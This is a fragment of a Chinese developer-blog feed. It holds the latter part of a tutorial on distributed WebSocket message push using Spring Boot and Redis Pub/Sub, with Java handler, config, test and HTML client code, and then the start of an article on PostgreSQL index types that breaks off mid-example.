        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> redisTemplate.getValueSerializer().deserialize(message.getBody());
        <span class="hljs-keyword">if</span> (ObjectUtil.isNull(value)) {
            log.warn(<span class="hljs-string">"#websocket::onMessage::return# 消息体为空"</span>);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-type">DWebSocketReqDTO</span> <span class="hljs-variable">reqDTO</span> <span class="hljs-operator">=</span> (DWebSocketReqDTO) value;
        log.info(<span class="hljs-string">"#websocket::onMessage# 接收到推送消息，userId={},type={}"</span>, reqDTO.getUserId(), reqDTO.getType());

        <span class="hljs-comment">// 2. 获取目标用户的SessionKey</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">sessionKey</span> <span class="hljs-operator">=</span> DWebSocketSessionManage.getSessionKey(reqDTO);
        <span class="hljs-keyword">if</span> (StrUtil.isBlank(sessionKey)) {
            log.warn(<span class="hljs-string">"#websocket::onMessage::return# 未获取到SessionKey，userId={}"</span>, reqDTO.getUserId());
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 3. 获取本地Session（当前实例是否连接该用户）</span>
        <span class="hljs-type">WebSocketSession</span> <span class="hljs-variable">userSession</span> <span class="hljs-operator">=</span> DWebSocketSessionManage.get(sessionKey);
        <span class="hljs-keyword">if</span> (userSession == <span class="hljs-literal">null</span>) {
            log.info(<span class="hljs-string">"#websocket::onMessage::return# 当前实例无该用户连接，userId={}"</span>, reqDTO.getUserId());
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 4. 推送消息给客户端</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (userSession.isOpen()) {
                <span class="hljs-type">String</span> <span class="hljs-variable">jsonStr</span> <span class="hljs-operator">=</span> JSONUtil.toJsonStr(reqDTO);
                userSession.sendMessage(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextMessage</span>(jsonStr));
                log.info(<span class="hljs-string">"#websocket::onMessage::success# 消息推送成功，userId={}"</span>, reqDTO.getUserId());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// Session已关闭，清理缓存</span>
                DWebSocketSessionManage.remove(sessionKey);
                log.warn(<span class="hljs-string">"#websocket::onMessage::close# Session已关闭，清理缓存，userId={}"</span>, reqDTO.getUserId());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"#websocket::onMessage::error# 消息推送失败，userId={}"</span>, reqDTO.getUserId(), e);
            <span class="hljs-comment">// 推送失败，清理Session</span>
            DWebSocketSessionManage.remove(sessionKey);
        }
    }
}
</code></pre>
<h3 data-id="heading-8">6. WebSocket 处理器：管理连接生命周期</h3>
<p>处理 WebSocket 连接的建立、消息接收、异常、关闭等生命周期事件：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.handler;

<span class="hljs-keyword">import</span> com.demo.redis.manage.DWebSocketSessionManage;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.web.socket.CloseStatus;
<span class="hljs-keyword">import</span> org.springframework.web.socket.TextMessage;
<span class="hljs-keyword">import</span> org.springframework.web.socket.WebSocketSession;
<span class="hljs-keyword">import</span> org.springframework.web.socket.handler.TextWebSocketHandler;

<span class="hljs-comment">/**
 * WebSocket处理器
 * 处理连接的建立、消息、异常、关闭等事件
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TextWebSocketHandler</span> {

    <span class="hljs-comment">/**
     * 连接建立成功后触发
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterConnectionEstablished</span><span class="hljs-params">(WebSocketSession session)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 生成SessionKey并添加到本地缓存</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">sessionKey</span> <span class="hljs-operator">=</span> DWebSocketSessionManage.getSessionKey(session);
        log.info(<span class="hljs-string">"#websocket::afterConnectionEstablished# 连接建立成功，sessionKey={},sessionId={}"</span>, sessionKey, session.getId());
        DWebSocketSessionManage.add(sessionKey, session);
    }

    <span class="hljs-comment">/**
     * 接收客户端发送的消息
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTextMessage</span><span class="hljs-params">(WebSocketSession session, TextMessage message)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">sessionKey</span> <span class="hljs-operator">=</span> DWebSocketSessionManage.getSessionKey(session);
        log.info(<span class="hljs-string">"#websocket::handleTextMessage# 接收客户端消息，sessionKey={},sessionId={},payload={}"</span>, 
                 sessionKey, session.getId(), message.getPayload());
        <span class="hljs-comment">// 示例：回复心跳包</span>
        session.sendMessage(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextMessage</span>(<span class="hljs-string">"pong"</span>));
    }

    <span class="hljs-comment">/**
     * 传输异常时触发
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTransportError</span><span class="hljs-params">(WebSocketSession session, Throwable exception)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">sessionKey</span> <span class="hljs-operator">=</span> DWebSocketSessionManage.getSessionKey(session);
        log.error(<span class="hljs-string">"#websocket::handleTransportError# 连接传输异常，sessionKey={},sessionId={}"</span>, 
                  sessionKey, session.getId(), exception);
        <span class="hljs-comment">// 清理异常连接</span>
        DWebSocketSessionManage.remove(sessionKey);
    }

    <span class="hljs-comment">/**
     * 连接关闭后触发
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterConnectionClosed</span><span class="hljs-params">(WebSocketSession session, CloseStatus status)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">sessionKey</span> <span class="hljs-operator">=</span> DWebSocketSessionManage.getSessionKey(session);
        log.info(<span class="hljs-string">"#websocket::afterConnectionClosed# 连接关闭，sessionKey={},sessionId={},status={}"</span>, 
                 sessionKey, session.getId(), status);
        <span class="hljs-comment">// 清理关闭的连接</span>
        DWebSocketSessionManage.remove(sessionKey);
    }
}
</code></pre>
<h3 data-id="heading-9">7. 核心配置类：整合所有组件</h3>
<p>配置 WebSocket 处理器、Redis 监听器、消息生产者等核心组件，完成分布式 WebSocket 的整体装配：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.config;  
  
  
<span class="hljs-keyword">import</span> com.demo.redis.handler.DWebSocketHandler;  
<span class="hljs-keyword">import</span> com.demo.redis.listener.DWebSocketRedisMessageListener;  
<span class="hljs-keyword">import</span> com.demo.redis.producer.DWebSocketProducer;  
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;  
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;  
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;  
<span class="hljs-keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;  
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.RedisTemplate;  
<span class="hljs-keyword">import</span> org.springframework.data.redis.listener.PatternTopic;  
<span class="hljs-keyword">import</span> org.springframework.data.redis.listener.RedisMessageListenerContainer;  
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.EnableWebSocket;  
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.WebSocketConfigurer;  
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;  
  
<span class="hljs-comment">/**  
* 分布式WebSocket核心配置  
*/</span>  
<span class="hljs-meta">@Slf4j</span>  
<span class="hljs-meta">@EnableWebSocket</span> <span class="hljs-comment">// 开启WebSocket支持  </span>
<span class="hljs-meta">@Configuration</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebSocketConfigurer</span> {  
  
<span class="hljs-comment">// Redis发布订阅频道  </span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">D_WEB_SOCKET_TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"d_web_socket_topic"</span>;  
<span class="hljs-comment">// WebSocket连接路径  </span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">WS_CONNECT_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/ws/connect"</span>;  
  
<span class="hljs-comment">/**  
* 注册WebSocket处理器  
*/</span>  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerWebSocketHandlers</span><span class="hljs-params">(WebSocketHandlerRegistry registry)</span> {  
<span class="hljs-comment">// 配置WebSocket连接路径，允许跨域  </span>
registry.addHandler(dWebSocketHandler(), WS_CONNECT_PATH)  
.setAllowedOrigins(<span class="hljs-string">"*"</span>);  
log.info(<span class="hljs-string">"#websocket::registerWebSocketHandlers# WebSocket注册成功，路径={}"</span>, WS_CONNECT_PATH);  
}  
  
<span class="hljs-comment">/**  
* 初始化WebSocket处理器  
*/</span>  
<span class="hljs-meta">@Bean</span>  
<span class="hljs-keyword">public</span> DWebSocketHandler <span class="hljs-title function_">dWebSocketHandler</span><span class="hljs-params">()</span> {  
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DWebSocketHandler</span>();  
}  
  
<span class="hljs-comment">/**  
* 初始化Redis消息监听器  
*/</span>  
<span class="hljs-meta">@Bean</span>  
<span class="hljs-keyword">public</span> DWebSocketRedisMessageListener <span class="hljs-title function_">dWebSocketRedisMessageListener</span><span class="hljs-params">(RedisTemplate&lt;String, Object&gt; redisTemplate)</span> {  
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DWebSocketRedisMessageListener</span>(redisTemplate);  
}  
  
<span class="hljs-comment">/**  
* 配置Redis消息监听容器  
*/</span>  
<span class="hljs-meta">@Bean(name = "dWebSocketRedisMessageListenerContainer")</span>  
<span class="hljs-keyword">public</span> RedisMessageListenerContainer <span class="hljs-title function_">redisMessageListenerContainer</span><span class="hljs-params">(  
RedisConnectionFactory redisConnectionFactory,  
DWebSocketRedisMessageListener dWebSocketRedisMessageListener)</span> {  
<span class="hljs-type">RedisMessageListenerContainer</span> <span class="hljs-variable">container</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisMessageListenerContainer</span>();  
container.setConnectionFactory(redisConnectionFactory);  
<span class="hljs-comment">// 订阅指定频道  </span>
container.addMessageListener(dWebSocketRedisMessageListener, <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternTopic</span>(D_WEB_SOCKET_TOPIC));  
log.info(<span class="hljs-string">"#websocket::redisMessageListenerContainer# Redis监听器注册成功，频道={}"</span>, D_WEB_SOCKET_TOPIC);  
<span class="hljs-keyword">return</span> container;  
}  
  
<span class="hljs-comment">/**  
* 初始化WebSocket消息生产者  
*/</span>  
<span class="hljs-meta">@Bean</span>  
<span class="hljs-keyword">public</span> DWebSocketProducer <span class="hljs-title function_">dWebSocketProducer</span><span class="hljs-params">(RedisTemplate&lt;String, Object&gt; redisTemplate)</span> {  
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DWebSocketProducer</span>(redisTemplate, D_WEB_SOCKET_TOPIC);  
}  
  
}
</code></pre>
<h2 data-id="heading-10">四、实战场景：推送用户消息</h2>
<h3 data-id="heading-11">1. 测试接口：触发消息推送</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis;  
  
<span class="hljs-keyword">import</span> com.demo.redis.dto.DWebSocketReqDTO;  
<span class="hljs-keyword">import</span> com.demo.redis.dto.User;  
<span class="hljs-keyword">import</span> com.demo.redis.enums.DWebSocketType;  
<span class="hljs-keyword">import</span> com.demo.redis.producer.DWebSocketProducer;  
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;  
<span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;  
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;  
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;  
<span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;  
  
<span class="hljs-meta">@Slf4j</span>  
<span class="hljs-meta">@SpringBootTest(classes = DemoRedisApplication.class)</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketProducerTest</span> {  
  
<span class="hljs-meta">@Autowired</span>  
<span class="hljs-keyword">private</span> DWebSocketProducer dWebSocketProducer;  
<span class="hljs-meta">@Value("${server.port}")</span>  
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;  
  
  
<span class="hljs-meta">@Test</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSend</span><span class="hljs-params">()</span> {  
log.info(<span class="hljs-string">"port:{}"</span>,port);  
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();  
user.setId(<span class="hljs-number">1L</span>);  
user.setName(<span class="hljs-string">"dd"</span>);  
DWebSocketReqDTO&lt;User&gt; req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DWebSocketReqDTO</span>&lt;User&gt;()  
.setType(DWebSocketType.DEMO.name())  
.setUserId(<span class="hljs-number">1L</span>)  
.setBody(user);  
dWebSocketProducer.send(req);  
}  
  
  
}
</code></pre>
<h3 data-id="heading-12">2. 客户端测试代码</h3>
<p>使用 HTML+JS 编写简单的 WebSocket 客户端，连接服务端并接收消息：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>分布式WebSocket测试<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>WebSocket测试（userId=1）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// 连接WebSocket（替换为实际服务端地址）</span>
    <span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">'ws://localhost:10088/demo/ws/connect?userId=1'</span>);
    
    <span class="hljs-comment">// 连接成功</span>
    ws.<span class="hljs-property">onopen</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'WebSocket连接成功'</span>);
        <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'连接成功'</span>);
    };
    
    <span class="hljs-comment">// 接收消息</span>
    ws.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'接收消息：'</span>, event.<span class="hljs-property">data</span>);
        <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'接收消息：'</span> + event.<span class="hljs-property">data</span>);
    };
    
    <span class="hljs-comment">// 连接关闭</span>
    ws.<span class="hljs-property">onclose</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'WebSocket连接关闭'</span>);
        <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'连接关闭'</span>);
    };
    
    <span class="hljs-comment">// 连接异常</span>
    ws.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'WebSocket异常：'</span>, error);
        <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'连接异常：'</span> + error);
    };
    
    <span class="hljs-comment">// 向页面追加消息</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">appendMessage</span>(<span class="hljs-params">msg</span>) {
        <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
        div.<span class="hljs-property">innerText</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleString</span>() + <span class="hljs-string">' - '</span> + msg;
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'message'</span>).<span class="hljs-title function_">appendChild</span>(div);
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-13">3. 分布式测试验证</h3>
<ol>
<li><strong>启动两个服务实例</strong>：分别启动端口 10088、10089 的服务；</li>
<li><strong>客户端连接</strong>：用 HTML 客户端连接 10088 端口（userId=1）；</li>
<li><strong>触发推送</strong>：调用 10089 端口 单元测试；</li>
<li><strong>验证结果</strong>：连接 10088 的客户端能接收到消息，证明跨实例推送成功。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40eebd8f96cd4f60974a50085b6a76ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768276488&amp;x-signature=%2BC2MnpOYUPGAveWh8uI1HBsYjwM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7476788708b046859aea2ce9db89bd5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768276488&amp;x-signature=QDChZgS5vNMVfjryE%2FZ7CRgK954%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-14">五、总结</h2>
<p>本文基于 SpringBoot+Redis 缓存实践，实现了分布式 WebSocket，核心要点：</p>
<ol>
<li><strong>核心原理</strong>：Redis Pub/Sub 作为消息中转站，跨实例同步推送指令，本地 Session 管理器负责实际推送；</li>
<li><strong>核心组件</strong>：生产者发布消息、监听器订阅消息、Session 管理器管理本地连接、处理器管理连接生命周期；</li>
<li><strong>实战验证</strong>：跨实例推送测试验证了方案的有效性，解决了单机 WebSocket 的局限性；</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PostgreSQL 索引类型详解]]></title>    <link>https://juejin.cn/post/7591780560486924288</link>    <guid>https://juejin.cn/post/7591780560486924288</guid>    <pubDate>2026-01-06T03:57:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591780560486924288" data-draft-id="7591744411740422144" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PostgreSQL 索引类型详解"/> <meta itemprop="keywords" content="PostgreSQL"/> <meta itemprop="datePublished" content="2026-01-06T03:57:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="光蛋"/> <meta itemprop="url" content="https://juejin.cn/user/3537560778573467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PostgreSQL 索引类型详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3537560778573467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    光蛋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T03:57:49.000Z" title="Tue Jan 06 2026 03:57:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 索引创建基础语法</h2>
<p>PostgreSQL 默认使用 <code>B-tree</code> 索引，通过 <code>CREATE INDEX</code> 命令创建；其他索引类型需通过 <code>USING</code> 关键字显式指定，通用语法如下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 默认创建 B-tree 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX 索引名 <span class="hljs-keyword">ON</span> 表名 (列名);

<span class="hljs-comment">-- 创建指定类型的索引</span>
<span class="hljs-keyword">CREATE</span> INDEX 索引名 <span class="hljs-keyword">ON</span> 表名 <span class="hljs-keyword">USING</span> 索引类型 (列名);

<span class="hljs-comment">-- 示例：创建 Hash 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_id <span class="hljs-keyword">ON</span> users <span class="hljs-keyword">USING</span> HASH (user_id);
</code></pre>
<h2 data-id="heading-1">2. 核心索引类型及实操样例</h2>
<h3 data-id="heading-2">2.1 B-tree 索引</h3>
<h4 data-id="heading-3">2.1.1 核心特性</h4>
<p>B-tree（平衡树）是 PostgreSQL 默认索引类型，适用于<strong>可排序数据</strong>的等值、范围查询，支持排序操作，是最通用的索引类型。</p>
<h4 data-id="heading-4">2.1.2 支持的操作符</h4>
<ul>
<li/>
<li>基础比较：&lt;（小于）、&lt;=（小于等于）、=（等于）、&gt;=（大于等于）、&gt;（大于）</li>
<li>组合条件：BETWEEN（介于两值之间）、IN（匹配列表中任一值）</li>
<li>空值判断：IS NULL（为空）、IS NOT NULL（不为空）</li>
<li>模式匹配（有限支持）：</li>
<li>LIKE 'foo%'（模糊匹配以foo开头的字符串）、~ '^foo'（正则匹配以foo开头的字符串）</li>
<li>ILIKE（不区分大小写的模糊匹配）、~*（不区分大小写的正则匹配），仅模式以非字母开头时生效</li>
</ul>
<h4 data-id="heading-5">2.1.3 实操样例</h4>
<p><strong>步骤1：创建测试表</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建用户表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
